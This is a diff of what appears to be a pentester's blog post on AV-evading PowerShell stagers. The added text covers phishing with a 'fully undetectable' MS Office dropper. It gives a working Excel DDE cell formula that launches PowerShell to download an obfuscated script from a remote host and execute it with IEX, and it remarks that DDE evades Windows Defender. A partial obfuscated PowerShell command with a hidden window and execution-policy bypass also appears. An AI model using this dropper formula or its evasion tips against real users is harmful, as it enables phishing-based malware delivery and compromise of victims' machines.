@@ -47,7 +47,13 @@ POWERsHeLL -NONINteRAcT -WINdoW  HidDEN -NoLO  -execUTIon bYpASS  -NOpROF  -comM
 
 Now let's keep the obfuscated payload and upload it as .ps1 to VirusTotal:  
 
-![https://phackt.com/public/images/stager/stager3.png](https://phackt.com/public/images/stager/stager3.png)
+![https://phackt.com/public/images/stager/stager3.png](https://phackt.com/public/images/stager/stager3.png)  
 
-I will come back soon with an Excel macro executing the powershell script.  
+Now can we phish someone with a FUD MS Office dropper?. This one is pretty tough, some recon/SE should be done to know at least what kind of AV exists on the machine.  However it's interesting to see that the Dynamic Data Exchange mechanism still flies under the radar of Windows Defender and other well know AVs without any specific obfuscation (no QUOTE or else).  
+
+For my purpose i finally used the following cell formula (taken from [https://blog.hyperiongray.com/excel-dde-exploitation-and-ml-av-bypass/](https://blog.hyperiongray.com/excel-dde-exploitation-and-ml-av-bypass/)):  
+```
+=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c powershell.exe -nop -w 1 $e=(New-Object System.Net.WebClient).DownloadString(\"http://192.168.1.24/powershell_dropper_obf.ps1\"); IEX $e'!'A1'
+```
+
 Cheers,
